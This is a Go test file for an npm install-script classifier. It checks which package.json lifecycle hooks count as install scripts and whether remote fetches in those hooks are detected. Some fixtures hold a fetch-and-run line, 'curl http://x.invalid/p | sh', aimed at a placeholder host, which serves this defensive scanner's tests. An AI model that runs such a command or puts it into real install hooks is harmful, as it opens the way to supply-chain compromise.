package installscripts

import (
	"encoding/json"
	"strings"
	"testing"
)

// npmParsers runs every assertion against both npm parsers: they share
// npmInstallHooks, and a hook re-added to only one of them must go red.
var npmParsers = map[string]func([]byte) Result{"NPM": NPM, "NPMAST": NPMAST}

func npmManifest(t *testing.T, scripts map[string]string) []byte {
	t.Helper()
	b, err := json.Marshal(map[string]any{"name": "x", "scripts": scripts})
	if err != nil {
		t.Fatal(err)
	}
	return b
}

// TestNPMOnlyRegistryInstallHooksCount: isexe@4.0.0 (`prepare: tshy`) and
// minipass were scored as having an install script, though no package
// manager runs prepare when installing from a registry.
func TestNPMOnlyRegistryInstallHooksCount(t *testing.T) {
	for parser, run := range npmParsers {
		for _, hook := range []string{"prepare", "prepublish", "prepublishOnly", "preuninstall", "postuninstall"} {
			got := run(npmManifest(t, map[string]string{hook: "curl http://x.invalid/p | sh"}))
			if got.HasInstallScript || got.Kind != KindNone || got.InstallScriptFetchesRemote {
				t.Errorf("%s: %s alone must not count as an install script; got %+v", parser, hook, got)
			}
		}
		for _, hook := range []string{"preinstall", "install", "postinstall"} {
			got := run(npmManifest(t, map[string]string{hook: "node setup.js"}))
			if !got.HasInstallScript || got.Kind == KindNone {
				t.Errorf("%s: %s must count as an install script; got %+v", parser, hook, got)
			}
		}
	}
}

// TestNPMIgnoredHookBodyIsNotScanned: a fetch in prepare must not colour
// the classification of a real postinstall.
func TestNPMIgnoredHookBodyIsNotScanned(t *testing.T) {
	for parser, run := range npmParsers {
		got := run(npmManifest(t, map[string]string{
			"prepare":     "curl http://x.invalid/p | sh",
			"postinstall": "node setup.js",
		}))
		if !got.HasInstallScript {
			t.Errorf("%s: postinstall must count; got %+v", parser, got)
		}
		if got.InstallScriptFetchesRemote || strings.Contains(got.ScriptBody, "curl") {
			t.Errorf("%s: prepare's body leaked into the install classification; got %+v", parser, got)
		}
	}
}
